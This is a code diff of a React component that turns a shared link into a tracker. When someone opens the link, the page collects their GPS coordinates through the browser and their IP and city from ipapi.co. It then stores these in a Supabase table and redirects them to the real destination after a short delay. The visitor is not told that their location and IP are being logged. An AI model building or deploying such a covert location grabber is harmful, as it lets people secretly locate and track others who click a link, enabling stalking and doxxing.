@@ -1,4 +1,5 @@
 import React, { useEffect, useState } from 'react';
+import { supabase } from '../supabase';
 
 export default function TrackerPage() {
   const [ok, setOk] = useState(false);
@@ -6,62 +7,70 @@ export default function TrackerPage() {
   useEffect(() => {
     async function coletar() {
       const id = window.location.pathname.split('/').pop();
-      let destino = '';
       let acesso = {
-        ip: 'Desconhecido',
-        loc: 'Desconhecida',
-        data: new Date().toLocaleString('pt-BR')
+        ip: 'Unknown',
+        loc: 'Unknown',
+        data: new Date().toLocaleString('en-US')
       };
-      function salvarAcesso() {
-        const links = JSON.parse(localStorage.getItem('links') || '[]');
-        const idx = links.findIndex(l => l.id === id);
-        if (idx !== -1) {
-          destino = links[idx].destino;
-          links[idx].acessos.unshift(acesso);
-          localStorage.setItem('links', JSON.stringify(links));
+      function getAcessoData() {
+        if (navigator.geolocation) {
+          return new Promise(resolve => {
+            navigator.geolocation.getCurrentPosition(
+              pos => {
+                acesso.loc = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
+                acesso.gps = true;
+                fetch('https://ipapi.co/json/')
+                  .then(resp => resp.json())
+                  .then(data => {
+                    acesso.ip = data.ip;
+                    resolve();
+                  })
+                  .catch(() => resolve());
+              },
+              err => {
+                fetch('https://ipapi.co/json/')
+                  .then(resp => resp.json())
+                  .then(data => {
+                    acesso.ip = data.ip;
+                    acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
+                    acesso.gps = false;
+                    resolve();
+                  })
+                  .catch(() => resolve());
+              },
+              { timeout: 5000 }
+            );
+          });
+        } else {
+          return fetch('https://ipapi.co/json/')
+            .then(resp => resp.json())
+            .then(data => {
+              acesso.ip = data.ip;
+              acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
+              acesso.gps = false;
+            })
+            .catch(() => {});
         }
-        setOk(true);
+      }
+      await getAcessoData();
+      // Busca o link pelo id
+      const { data, error } = await supabase
+        .from('links')
+        .select('*')
+        .eq('id', id)
+        .single();
+      if (data) {
+        // Atualiza acessos
+        const novosAcessos = [...(data.acessos || []), acesso];
+        await supabase
+          .from('links')
+          .update({ acessos: novosAcessos })
+          .eq('id', id);
         setTimeout(() => {
-          if (destino) window.location.href = destino;
+          if (data.destino) window.location.href = data.destino;
         }, 1500);
       }
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            acesso.loc = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
-            acesso.gps = true;
-            fetch('https://ipapi.co/json/')
-              .then(resp => resp.json())
-              .then(data => {
-                acesso.ip = data.ip;
-                salvarAcesso();
-              })
-              .catch(() => salvarAcesso());
-          },
-          err => {
-            fetch('https://ipapi.co/json/')
-              .then(resp => resp.json())
-              .then(data => {
-                acesso.ip = data.ip;
-                acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
-                acesso.gps = false;
-                salvarAcesso();
-              })
-              .catch(() => salvarAcesso());
-          },
-          { timeout: 5000 }
-        );
-      } else {
-        fetch('https://ipapi.co/json/')
-          .then(resp => resp.json())
-          .then(data => {
-            acesso.ip = data.ip;
-            acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
-            acesso.gps = false;
-            salvarAcesso();
-          })
-          .catch(() => salvarAcesso());
-      }
+      setOk(true);
     }
     coletar();
   }, []);
